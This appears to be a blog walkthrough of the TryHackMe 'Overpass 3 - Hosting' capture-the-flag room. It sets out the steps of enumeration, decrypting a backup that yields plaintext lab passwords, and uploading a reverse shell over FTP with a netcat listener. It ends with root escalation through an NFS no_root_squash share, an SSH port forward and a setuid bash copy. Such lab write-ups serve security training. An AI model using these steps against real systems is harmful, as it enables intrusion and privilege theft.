---
title: Overpass 3 - Hosting
date: 2022-12-18 18:32:00 -0500
categories: [Walkthrough, Tryhackme, CTF]
tags: [overpass, centOS, linux, privesc]
---

<https://tryhackme.com/room/overpass3hosting> You know them, you love them, your favourite group of broke computer science students have another business venture! Show them that they probably should hire someone for security...

# Notes


- `gobuster dir -u http://overpass3hosting.thm -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 100 -x txt,php` we find a backups folder with a zip lets get that and check it. dont see any other files on the server.

inside of backups theres a priv key and a gpg file. 

- `gpg --import priv.key`

looks like the key is expired

we can slect the key and edit with gpg and refresh the expiry and open the xls file.

opening the xls gives us a few usernames and passwords

```
paradox	ShibesAreGreat123
0day	OllieIsTheBestDog
muirlandoracle	A11D0gsAreAw3s0me
```

we can use paradox's creds to login to the ftp, because their ftp server is their webserver dir we can use this to upload a remote shell.

```
┌──(0xskar㉿cocokali)-[~/Documents/TryHackMe/overpass3hosting]
└─$ nc -nvlp 6669             
listening on [any] 6669 ...
connect to [10.2.3.64] from (UNKNOWN) [10.10.16.128] 41210
Linux localhost.localdomain 4.18.0-193.el8.x86_64 #1 SMP Fri May 8 10:59:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 01:51:30 up  1:10,  0 users,  load average: 0.00, 0.03, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: cannot set terminal process group (848): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$ whoami
whoami
apache
```

- we can run `find / -name *flag* 2>/dev/null` to find the web flag.

# privilege escalation

`/home/james *(rw,fsid=0,sync,no_root_squash,insecure)`

james has `no_root_squash`: This option basically gives authority to the root user on the client to access files on the NFS server as root. And this can lead to serious security implications. Read the /etc/exports file, if you find some directory that is configured as `no_root_squash`, then you can access it from as a client and write inside that directory as if you were the local root of the machine.

`no_root_squash`: This option basically gives authority to the root user on the client to access files on the NFS server as root. And this can lead to serious security implications.

we can also swap to user paradox with his pass `su`.

trying to use `https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe` escalation we seem to have an issue connecting with the target machine so in order to connect we will need to setup an ssh port forward.

1. generate a private/public key on the target - `ssh-keygen -f paradox`
2. copy contents of puclic key and edit authorized_keys file on our attacker machine `echo "paradox_key" >> /home/paradox/.ssh/authorized_keys`
3. now we can connect via ssh using the private key after we copy it over to our attacker. 

to check which ports the nfs is listening on we can run `rpcinfo -p` which tells us port `2049`. with this information we can do some SSH port forwarding.

- `ssh paradox@overpass3hosting.thm -i paradox -L 2049:localhost:2049`

create a directory for the share and mount `mkdir /tmp/pe && sudo mount -v -t nfs localhost:/ /tmp/pe`

we get the user flag within the mounted share. we can also `ls -las` and see everything inside james share. we can copy james` priv ssh key and login next stop root. since we can login to james now we can copy bash and simply obtain root.


1. target `cp /bin/bash .`
2. attacker shared `sudo su`, `chown root:root bash`, `chmod +s bash`
3. on the target `./bash -p`

from here we can `cat root.flag` in the root dir.


